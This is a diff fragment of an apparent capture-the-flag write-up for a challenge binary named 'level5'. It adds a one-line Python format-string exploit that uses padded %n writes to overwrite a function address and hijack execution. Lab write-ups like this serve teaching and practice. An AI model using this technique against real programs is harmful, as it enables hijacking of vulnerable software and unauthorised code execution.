@@ -274,3 +274,11 @@ And we are good !
 Now we can launche the exploit with the binary :
 
 (python /tmp/exploit.py; cat) | ./level5
+
+
+Here is another way to write the exploit in one line :
+
+
+					FUNCTION O       +  FUNCTION O + 2    + padding to get 0x000084a4 + padding to get 0x10804
+(python -c 'print "\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%33948x" + "%4$n"        + "%33632x" + "%5$n"' ; cat) | ./level5
+
